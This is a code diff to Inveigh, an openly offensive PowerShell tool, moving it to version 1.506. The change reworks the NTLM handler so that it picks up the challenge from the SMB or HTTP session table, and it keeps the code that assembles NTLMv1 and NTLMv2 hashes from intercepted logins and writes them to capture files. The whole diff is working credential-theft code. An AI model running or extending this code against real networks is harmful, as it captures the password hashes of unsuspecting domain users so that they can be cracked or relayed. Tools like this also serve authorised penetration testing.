@@ -500,7 +500,7 @@ if($invalid_parameter)
     throw
 }
 
-$inveigh_version = "1.505"
+$inveigh_version = "1.506"
 
 if(!$IP)
 { 
@@ -2023,106 +2023,134 @@ $NTLM_functions_scriptblock =
             $host_length = Get-UInt16DataLength ($NTLMSSP_offset + 44) $Payload
             $host_offset = Get-UInt32DataLength ($NTLMSSP_offset + 48) $Payload
             $NTLM_host_string = Convert-DataToString ($NTLMSSP_offset + $host_offset) $host_length $Payload
-            $NTLM_challenge = $inveigh.HTTP_session_table.$session
 
+            if($Protocol -eq "SMB")
+            {
+                $NTLM_challenge = $inveigh.SMB_session_table.$session
+            }
+            else
+            {
+                $NTLM_challenge = $inveigh.HTTP_session_table.$session
+            }
+            
             if($NTLM_length -gt 24)
             {
-                $NTLMv2_response = $NTLM_response.Insert(32,':')
-                $NTLMv2_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLMv2_response
 
-                if($Capture -eq 'Y')
+                if($NTLM_challenge)
                 {
 
-                    if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))
-                    {
-                        $inveigh.NTLMv2_list.Add($NTLMv2_hash) > $null
+                    $NTLMv2_response = $NTLM_response.Insert(32,':')
+                    $NTLMv2_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLMv2_response
 
-                        if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string"))
+                    if($Capture -eq 'Y')
+                    {
+
+                        if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))
                         {
-                            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 captured for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:") > $null
-                            $inveigh.output_queue.Add($NTLMv2_hash) > $null
+                            $inveigh.NTLMv2_list.Add($NTLMv2_hash) > $null
+
+                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string"))
+                            {
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 captured for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:") > $null
+                                $inveigh.output_queue.Add($NTLMv2_hash) > $null
+                            }
+                            else
+                            {
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 captured for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[not unique]") > $null
+                            }
+
+                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")))
+                            {
+                                $inveigh.NTLMv2_file_queue.Add($NTLMv2_hash) > $null
+                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 written to " + "Inveigh-NTLMv2.txt") > $null
+                            }
+
+                            if($inveigh.NTLMv2_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")
+                            {
+                                $inveigh.NTLMv2_username_list.Add("$SourceIP $NTLM_domain_string\$NTLM_user_string") > $null
+                            }
+
+                            if($inveigh.IP_capture_list -notcontains $SourceIP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $SourceIP -ne $IP)
+                            {
+                                $inveigh.IP_capture_list.Add($SourceIP) > $null
+                            }
+
                         }
                         else
                         {
-                            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 captured for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[not unique]") > $null
-                        }
-
-                        if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")))
-                        {
-                            $inveigh.NTLMv2_file_queue.Add($NTLMv2_hash) > $null
-                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 written to " + "Inveigh-NTLMv2.txt") > $null
-                        }
-
-                        if($inveigh.NTLMv2_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")
-                        {
-                            $inveigh.NTLMv2_username_list.Add("$SourceIP $NTLM_domain_string\$NTLM_user_string") > $null
-                        }
-
-                        if($inveigh.IP_capture_list -notcontains $SourceIP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $SourceIP -ne $IP)
-                        {
-                            $inveigh.IP_capture_list.Add($SourceIP) > $null
+                            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 ignored for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[machine account]") > $null    
                         }
 
                     }
                     else
                     {
-                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 ignored for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[machine account]") > $null    
+                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 ignored for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[capture disabled]") > $null    
                     }
 
                 }
                 else
                 {
-                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 ignored for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[capture disabled]") > $null    
+                    $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 challenge missing for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort") > $null    
                 }
 
             }
             elseif($NTLM_length -eq 24)
             {
-                $NTLMv1_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $LM_response + ":" + $NTLM_response + ":" + $NTLM_challenge
 
-                if($Capture -eq 'Y')
+                if($NTLM_challenge)
                 {
 
-                    if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))
-                    {
-                        $inveigh.NTLMv1_list.Add($NTLMv1_hash) > $null
+                    $NTLMv1_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $LM_response + ":" + $NTLM_response + ":" + $NTLM_challenge
 
-                        if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string"))
+                    if($Capture -eq 'Y')
+                    {
+
+                        if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))
                         {
-                            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 captured for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:") > $null
-                            $inveigh.output_queue.Add($NTLMv1_hash) > $null
+                            $inveigh.NTLMv1_list.Add($NTLMv1_hash) > $null
+
+                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string"))
+                            {
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 captured for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:") > $null
+                                $inveigh.output_queue.Add($NTLMv1_hash) > $null
+                            }
+                            else
+                            {
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 captured for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[not unique]") > $null
+                            }
+
+                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")))
+                            {
+                                $inveigh.NTLMv1_file_queue.Add($NTLMv1_hash) > $null
+                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] SMB($Port) NTLMv1 written to " + "Inveigh-NTLMv1.txt") > $null
+                            }
+
+                            if($inveigh.NTLMv1_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")
+                            {
+                                $inveigh.NTLMv1_username_list.Add("$SourceIP $NTLM_domain_string\$NTLM_user_string") > $null
+                            }
+
+                            if($inveigh.IP_capture_list -notcontains $SourceIP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $SourceIP -ne $IP)
+                            {
+                                $inveigh.IP_capture_list.Add($SourceIP) > $null
+                            }
+
                         }
                         else
                         {
-                            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 captured for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[not unique]") > $null
-                        }
-
-                        if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")))
-                        {
-                            $inveigh.NTLMv1_file_queue.Add($NTLMv1_hash) > $null
-                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] SMB($Port) NTLMv1 written to " + "Inveigh-NTLMv1.txt") > $null
-                        }
-
-                        if($inveigh.NTLMv1_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")
-                        {
-                            $inveigh.NTLMv1_username_list.Add("$SourceIP $NTLM_domain_string\$NTLM_user_string") > $null
-                        }
-
-                        if($inveigh.IP_capture_list -notcontains $SourceIP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $SourceIP -ne $IP)
-                        {
-                            $inveigh.IP_capture_list.Add($SourceIP) > $null
+                            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv1 ignored for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[machine account]") > $null    
                         }
 
                     }
                     else
                     {
-                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv1 ignored for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[machine account]") > $null    
+                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv1 ignored for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[capture disabled]") > $null    
                     }
 
                 }
                 else
                 {
-                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv1 ignored for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[capture disabled]") > $null    
+                    $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] $Protocol($Port) NTLMv1 challenge missing for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort") > $null    
                 }
 
             }
